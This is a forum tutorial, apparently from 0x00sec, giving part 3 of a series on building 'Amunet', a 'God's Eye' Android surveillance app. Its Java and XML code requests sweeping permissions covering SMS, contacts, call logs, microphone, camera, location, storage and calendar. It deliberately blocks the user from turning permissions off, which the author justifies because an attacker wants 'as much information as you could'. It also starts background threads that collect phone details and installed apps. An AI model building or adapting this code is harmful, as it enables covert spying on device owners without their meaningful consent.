<p>We now have two activities ( UI Interfaces ) for our app: <code>MainActivity</code> and <code>Dashboard</code> respectively. They are both <strong>BASIC ACTIVITY</strong> layouts, created in the previous tutorials. For every basic activity created, two layout files are generated: <code>activity_(layout_name)</code> and <code>content_(layout_name)</code> which in our case is <code>activity_dashboard</code> and <code>content_dashboard</code> ( Dashboard UI ). We will create our UI in the <code>content_dashboard</code> file. Let’s head over to the file and code.</p>
<p>We won’t add any element or UI object but one. Guess the element ( Its a View element ) ?</p>
<p>It’s a …</p>

Summary <a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317/1">(click for more details)</a>
<p>Drag and drop a Recycler View from the toolbox unto the content_dashboard.xml file. You should have something similar to …</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:app="http://schemas.android.com/apk/res-auto"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
app:layout_behavior="@string/appbar_scrolling_view_behavior"
tools:context=".Dashboard"
tools:showIn="@layout/activity_dashboard"&gt;

&lt;android.support.v7.widget.RecyclerView
    android:layout_width="match_parent"
    android:id="@+id/dashboard_recycler_view"
    android:layout_height="wrap_content" /&gt;

&lt;/RelativeLayout&gt;
</code></pre>
<p>The <code>id</code> assigned to our recycler view is <code>dashboard_recycler_view</code> ( take note ). Done.</p>
<p>The recycler view simply holds the view and therefore needs a layout design file to populate it. It’s just like a container. The layout design file are the boxes that are placed inside the container. Hope you get it. More read on RecyclerViews on <a href="https://google.com" rel="noopener nofollow ugc">Google</a>.</p>
<p>To create a layout design file, simply <code>right click</code> on the <code>layout</code> directory  under <code>res</code> in Android Studio and select <code>New</code> -&gt; <code>Layout resource file</code> and give it a name. For this tutorial, we will name it <code>recycler_items</code>. If you name it anything else, do well to correct it in the code otherwise your RecyclerView won’t be populated ( that is, if you Android Studio compiles it ).</p>
<p>The layout file should be created under the <code>res</code> -&gt; <code>layout</code> directory.</p>
<p><strong>RECYCLER_ITEMS.XML</strong></p>
<p>This file will only hold one UI object. The object is a Switch ( Toggle - ON / OFF ). Every one knows a switch. A baby even does so no explanation here. By default, our toggle will be off. When we toggle it ( ON ), it asks us for the permission. This is the code.</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;RelativeLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:padding="10dp"
android:layout_height="wrap_content"&gt;

&lt;Switch
    android:layout_width="match_parent"
    android:text="Permission Name"
    android:id="@+id/permission_switch"
    android:textOff="Denied"
    android:textOn="Allowed"
    android:layout_height="wrap_content" /&gt;

&lt;/RelativeLayout&gt;
</code></pre>
<p>Hope we are all on the same page. Easy right ?</p>
<p>If you’ve ever worked with a recycler view, you know that it needs an adapter and list class to populate it. Read more on Google. Check out <a href="https://www.androidhive.info/2016/01/android-working-with-recycler-view/" rel="noopener nofollow ugc">Android Working with Recycler View</a>.</p>
<p><strong>CREATING A RECYCLER LIST CLASS</strong></p>
<p>We need a list that is passed to the adapter and the adapter in turn populates the recycler view with the list. Create a new java class name it <code>RecyclerJava</code>.</p>
<p>When it is created, you should have an empty class. Lets write our code</p>
<pre><code>String permission_name;
String[] permission_identifier;
int permission_request_code;

public String getPermission_name() {
    return permission_name;
}

public String[] getPermission_identifier() {
    return permission_identifier;
}

public int getPermission_request_code() {
    return permission_request_code;
}

public RecyclerJava(String permission_name, String[] permission_identifier, int permission_request_code) {
    this.permission_identifier = permission_identifier;
    this.permission_name = permission_name;
    this.permission_request_code = permission_request_code;
}
</code></pre>
<p>Before I explain the codes, lets first understand the logic.</p>
<p>The switch object we created earlier ( <code>recycler_items.xml</code> ) will need a text showing what it stands for, permission it should request when toggled and the permission request code.</p>
<p>In Android, to request a permission, we need a request code. The Request code help us identify the permission later on and determine if it was granted or denied.</p>
<ol>
<li>
<code>String permission_name</code> - The text that is displayed on the Switch object eg Camera, Contacts.</li>
<li>
<code>String[] permission_identifier</code> - Some phone functionalities ( like CAMERA, MIC, VIBRATION ) need only one permission whilst other functionalities ( like GPS, CALENDAR) need multiple permission requests. The string array allows both scenarios to be satisfied.</li>
<li>
<code>int permission_request_code</code> - Request codes helps us determine if the permission was granted or not.</li>
<li>The remaining 3 functions below the above are getters.</li>
<li>The last function is a constructor that takes data from the user and updates the Class.</li>
</ol>
<p><strong>CREATING A RECYCLER ADAPTER CLASS</strong></p>
<p>Recycler adapter classes are quite tricky and a personal choice depending on how you want to achieve your goal. I always have difficulty with adapter classes but managed to push through for this tutorial. It should work for our series.</p>
<p>What the adapter does is, it takes the list objects from the <code>RecyclerJava</code> class passed to it, finds the switch object in <code>recycler_items.xml</code> and makes sure the codes within the adapter for a particular view or object are executed. You’ll understand more as we go on. Create a new java class name it <code>RecyclerAdapter</code>.</p>
<p>When it is created, you should have an empty class. Lets write our code.</p>
<pre><code>package &lt;package name goes here&gt;

import android.content.Context;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;

import java.util.List;

public class RecyclerAdapter extends RecyclerView.Adapter&lt;RecyclerAdapter.MyViewHolder&gt; {

private List&lt;RecyclerJava&gt; recyclerJava;

public class MyViewHolder extends RecyclerView.ViewHolder {

    Switch aSwitch;
    Context context;

    private String[] permission_identifier;
    private int permission_request_code;

    public MyViewHolder(View view) {
        super(view);
        context = view.getContext();

        aSwitch = view.findViewById(R.id.permission_switch);
        aSwitch.setChecked(false);
    }
}

public RecyclerAdapter(List&lt;RecyclerJava&gt; recyclerList) {
    this.recyclerJava = recyclerList;
}

@Override
public MyViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
    View itemView = LayoutInflater.from(parent.getContext())
            .inflate(R.layout.recycler_items, parent, false);

    return new MyViewHolder(itemView);
}

@Override
public void onBindViewHolder(final MyViewHolder holder, int position) {
    RecyclerJava data = recyclerJava.get(position);

    String permission_name = data.getPermission_name();
    holder.permission_identifier = data.getPermission_identifier();
    holder.permission_request_code = data.getPermission_request_code();

    holder.aSwitch.setText(permission_name.toUpperCase());

    if(ActivityCompat.checkSelfPermission(holder.context, holder.permission_identifier[0]) != PackageManager.PERMISSION_GRANTED) {
        holder.aSwitch.setChecked(false);
    } else {
        holder.aSwitch.setChecked(true);
    }

    holder.aSwitch.setOnCheckedChangeListener( new CompoundButton.OnCheckedChangeListener() {
        @Override
        public void onCheckedChanged(CompoundButton compoundButton, boolean b) {

            if(b) {
                ((Dashboard)holder.context).PermissionRequestHandler(holder.permission_identifier, holder.permission_request_code);
            } else {
                holder.aSwitch.setChecked(true);
                Toast.makeText(holder.context, "Action Not Permitted", Toast.LENGTH_LONG).show();
            }
        }
    });

    holder.setIsRecyclable(false);
}

@Override
public int getItemCount() {
    return recyclerJava.size();
}

}
</code></pre>
<p>Lets take it bit by bit.</p>
<p>1 - In the <code>onCreateViewHolder</code> method ( prolly line 43 ), the method takes the <code>recycler_items.xml</code> layout file and populates it into the <code>recyclerview</code>. The layout file holds sub views which is accessed by the <code>adapter</code> class.</p>
<p>If you try accessing any other view outside the ones specified in the defined layout file, prepare yourself for a crash landing course with Android Studio. You won’t make it far. <img src="https://0x00sec.org/images/emoji/twitter/rofl.png?v=9" title=":rofl:" class="emoji" alt=":rofl:">.</p>
<p>2 - Within the <code>MyViewHolder</code> sub class <code>public class MyViewHolder extends RecyclerView.ViewHolder {</code>, we need to get a reference to our ui objects before we can access them. Don’t do long running codes in this method ( in my experience ).</p>
<p>3 - Every method needs a constructor ( I think ) and so does our adapter class. In <code>public RecyclerAdapter(List&lt;RecyclerJava&gt; recyclerList) {</code>, we accept a list argument ( parameter ). Through this constructor, we can take our list and populate our view with it.</p>
<p>4 - Last but one</p>
<ul>
<li>
<p>The method <code>public void onBindViewHolder(final MyViewHolder holder, int position) {</code> allows us to assign the data from the list to the ui objects in the passed layout file (  <code>onCreateViewHolder</code> method ).</p>
</li>
<li>
<p>In this method, the views from the layout files are accessed through the <code>holder</code> variable. We get the data from the list through the <code>getters</code> we added in the <code>RecyclerJava</code> class created earlier.</p>
</li>
<li>
<p>We check if the permission array passed to the adapter has already granted or denied, the appropriate actions are executed.</p>
</li>
<li>
<p>If permission is already granted, the switch is toggled on, when it’s not, it’s toggled off. As a hacker or attacker, you won’t need to turn a permission off because you would want to gather as much information as you could so I therefore disabled the toggling off permissions.</p>
</li>
<li>
<p>If a permission hasn’t been granted ( maybe first time install ), we call a <code>PermissionRequestHandler</code> method from the DashBoard.java file ( discussed later ) when the switch is toggled on.</p>
</li>
<li>
<p>The <code>PermissionRequestHandler</code> method takes two parameter: the <code> permission identifier</code> ( string array) and the <code>permission request code</code>.</p>
</li>
</ul>
<p>5 - The last method <code>public int getItemCount() {</code> is important. It returns the size of the list items passed to the adapter.</p>
<p>Lets now head over to the <code>Dashboard.java</code> file and finish what we started.</p>
<p><strong>DASHBOARD.JAVA</strong></p>
<p>In this method, we tie up the knot and marry our activities and classes together.</p>
<p>We first need to declare the permission request codes below our <code>public class</code> declaration. We also declare our <code>RecyclerJava</code> list class and <code>RecyclerAdapter</code> class in this section.</p>
<pre><code>public class Dashboard extends AppCompatActivity {

private RecyclerView recyclerView;
private List&lt;RecyclerJava&gt; recyclerJavaList = new ArrayList&lt;&gt;();
private RecyclerAdapter recyclerAdapter;

protected static final int GPS_REQUEST_CODE = 5000;
protected static final int CONTACTS_REQUEST_CODE = 5001;
protected static final int CALENDAR_REQUEST_CODE = 5002;
protected static final int MIC_REQUEST_CODE = 5003;
protected static final int CAMERA_REQUEST_CODE = 5004;
protected static final int STORAGE_REQUEST_CODE = 5005;
protected static final int SMS_REQUEST_CODE = 5006;
protected static final int GET_ACCOUNTS_REQUEST_CODE = 5007;
</code></pre>
<p>With that out of the way, let’s go on write the <code>PermissionRequestHandler</code> method declared in <code>RecyclerAdapter</code> class. The method takes the string array containing the various permissions needed and the appropriate request code.</p>
<pre><code>protected void PermissionRequestHandler(String[] permission_identifier, int RequestCode) {
    if(ActivityCompat.checkSelfPermission(getApplicationContext(), permission_identifier[0]) != PackageManager.PERMISSION_GRANTED) {
        ActivityCompat.requestPermissions(Dashboard.this, permission_identifier, RequestCode);
    }
}
</code></pre>
<p>Whenever a permission is requested in android, the result is not received in the calling method but instead is received in another method ( like a callback ). The callback method is <code>onRequestPermissionsResult</code>.</p>
<pre><code>@Override
public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);

    switch (requestCode) {
        case GPS_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "GPS Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case SMS_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "SMS Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case GET_ACCOUNTS_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "Phone Accounts Access Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case CAMERA_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "CAMERA Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case CALENDAR_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "CALENDAR Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case MIC_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "MIC Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case CONTACTS_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "CONTACTS Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
        case STORAGE_REQUEST_CODE: {
            if (grantResults.length &gt; 0 &amp;&amp; grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(getApplicationContext(), "STORAGE Permission Denied", Toast.LENGTH_LONG).show();
            }
            updateRecycler();
        }
    }
}
</code></pre>
<p>A new method ( <code>updateRecycler()</code> ) is introduced in the method above. The <code>updateRecycler()</code> is the method where all the hard work of this tutorial is tied into. The method passes the information to the adapter which in turn populates the recyclerview. Let’s dive right into it.</p>
<pre><code>private void updateRecycler() {

    recyclerJavaList.clear();

    RecyclerJava sms_permission = new RecyclerJava("SMS",
            new String[] {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS}, SMS_REQUEST_CODE);
    recyclerJavaList.add(sms_permission);

    RecyclerJava accounts_permission = new RecyclerJava("ACCOUNTS",
            new String[] {Manifest.permission.GET_ACCOUNTS}, GET_ACCOUNTS_REQUEST_CODE);
    recyclerJavaList.add(accounts_permission);

    RecyclerJava camera_permission = new RecyclerJava("Camera",
            new String[] {Manifest.permission.CAMERA}, CAMERA_REQUEST_CODE);
    recyclerJavaList.add(camera_permission);

    RecyclerJava filesystem_permission = new RecyclerJava("Storage",
            new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, STORAGE_REQUEST_CODE);
    recyclerJavaList.add(filesystem_permission);

    RecyclerJava calendar_permission = new RecyclerJava("Calendar",
            new String[] {Manifest.permission.READ_CALENDAR, Manifest.permission.WRITE_CALENDAR}, CALENDAR_REQUEST_CODE);
    recyclerJavaList.add(calendar_permission);

    RecyclerJava gps_permission = new RecyclerJava("GPS Location",
            new String[] {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, GPS_REQUEST_CODE);
    recyclerJavaList.add(gps_permission);

    RecyclerJava mic_permission = new RecyclerJava("Record Microphone",
            new String[] {Manifest.permission.RECORD_AUDIO}, MIC_REQUEST_CODE);
    recyclerJavaList.add(mic_permission);

    RecyclerJava contact_permission = new RecyclerJava("Contacts &amp; Call Logs",
            new String[] {Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.PROCESS_OUTGOING_CALLS}, CONTACTS_REQUEST_CODE);
    recyclerJavaList.add(contact_permission);

    recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
    recyclerView.setAdapter(recyclerAdapter);
    recyclerAdapter.notifyDataSetChanged();
}
</code></pre>
<p>The method creates a list and passes it to the adapter. Notice that some functionalities have double permissions whilst others only need one.</p>
<p>We need to however call this method from the <code>onCreate</code> method.</p>
<p><strong>ONCREATE METHOD</strong></p>
<p>In the <code>onCreate</code>, we set references ( recyclerview, adapter ) and call the needed functions ( updateRecycler ).</p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_dashboard);
    Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
    setSupportActionBar(toolbar);

    recyclerView = findViewById(R.id.dashboard_recycler_view);

    recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
    RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
    recyclerView.setLayoutManager(mLayoutManager);
    recyclerView.setItemAnimator(new DefaultItemAnimator());
    recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));

    updateRecycler();
}
</code></pre>
<p><strong>THE IMPORT STATEMENT</strong></p>
<p>Incase you are having trouble with your import statements, these are the complete import statements</p>
<pre><code>import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.DefaultItemAnimator;
import android.support.v7.widget.DividerItemDecoration;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.Toolbar;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;
</code></pre>
<p><strong>ANDROID MANIFEST</strong></p>
<p>You can have all permissions coded but if you don’t specify them in the <code>AndroidManifest.xml</code> file, it won’t be processed when requested. This is the complete AndroidManifest file.</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="org.a0x00sec.amunet"&gt;

&lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;
&lt;uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" /&gt;

&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
&lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;

&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;
&lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;

&lt;uses-permission android:name="android.permission.READ_CONTACTS" /&gt;
&lt;uses-permission android:name="android.permission.WRITE_CONTACTS" /&gt;

&lt;uses-permission android:name="android.permission.CAMERA" /&gt;

&lt;uses-permission android:name="android.permission.VIBRATE" /&gt;

&lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /&gt;
&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;

&lt;uses-permission android:name="android.permission.READ_SMS" /&gt;
&lt;uses-permission android:name="android.permission.WRITE_SMS" /&gt;
&lt;uses-permission android:name="android.permission.RECEIVE_SMS" /&gt;

&lt;uses-permission android:name="android.permission.RECORD_AUDIO" /&gt;

&lt;uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" /&gt;

&lt;uses-permission android:name="android.permission.READ_CALENDAR" /&gt;
&lt;uses-permission android:name="android.permission.WRITE_CALENDAR" /&gt;

&lt;application
    android:allowBackup="true"
    android:icon="@mipmap/godseye"
    android:label="@string/app_name"
    android:roundIcon="@mipmap/godseye"
    android:supportsRtl="true"
    android:theme="@style/AppTheme"&gt;

    &lt;activity
        android:name=".MainActivity"
        android:label="@string/app_name"
        android:theme="@style/AppTheme.NoActionBar"&gt;
        &lt;intent-filter&gt;
            &lt;action android:name="android.intent.action.MAIN" /&gt;

            &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
        &lt;/intent-filter&gt;
    &lt;/activity&gt;

    &lt;activity
        android:name=".Dashboard"
        android:label="@string/title_activity_dashboard"
        android:theme="@style/AppTheme.NoActionBar" /&gt;

&lt;/application&gt;

&lt;/manifest&gt;
</code></pre>
<p>The only changes are the <code>permissions</code> above the <code>application</code> tag.</p>
<p><strong>HOUSE KEEPING</strong></p>
<p>In the previous tutorial ( <code>MainActivity.java</code> ), under <code>create_phone_account</code>, we placed this line of code  <code>progressDialog.dismiss();</code> exactly under <code>public void onResponse(String req) {</code>.</p>
<p>It will still work but will led the user to exit the app after the registration is complete. That is the idea but if you followed from previous tutorials, we added threads to run once the registration is done. This thread will therefore be cancelled. Instead of putting the dismiss code before the CountdownTimer, we place it after it. The <code>onResponse</code> section of the <code>create_phone_account</code> method will look like this.</p>
<pre><code>public void onResponse(String req) {
            // progressDialog.dismiss();

            try {

                final JSONObject response = new JSONObject(req);

                if(response.getBoolean("success")) {
                    final String server_response = response.getString("response");

                    SharedPreferences.Editor editor = sharedPreferences.edit();

                    editor.putString("auth_key", response.getString("api_key"));

                    editor.apply();

                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            collect_phone_details();
                            collect_installed_apps();
                        }
                    }).start();

                    new CountDownTimer(6000,1000) {
                        @Override
                        public void onTick(long l) {

                        }

                        @Override
                        public void onFinish() {
                            show_alert(server_response);
                        }
                    }.start();

                    username.setText("");
                    password.setText("");
                    name.setText("");

                    progressDialog.dismiss(); // New line of code
                    startActivity(new Intent(MainActivity.this, Dashboard.class));
                    finish();
                } else {
                    show_alert(response.getString("response"));
                }
            } catch (Exception e) {
                show_alert("Authentication error: " + e.getMessage());
            }
        }
</code></pre>
<p>That should be the end of this tutorial. You can run your app.</p>
<p><strong>CONCLUSION</strong></p>
<p>I would love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.</p>
<p>You can directly import the project into your android studio if you are having trouble.</p>
<p>Checkout the github repo: <a href="https://github.com/sergeantexploiter/Amunet" rel="noopener nofollow ugc">https://github.com/sergeantexploiter/Amunet</a></p>
<p>Until we meet again. I’m out.</p>
<p><strong><span class="hashtag">#Sergeant</span></strong></p>
          <p><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317/1</link>
        <pubDate>Fri, 29 Jun 2018 14:35:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-7317-1</guid>
        <source url="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317.rss">Building a God’s Eye Android App: Part 3 - Permission Granting</source>
      </item>
  </channel>
</rss>
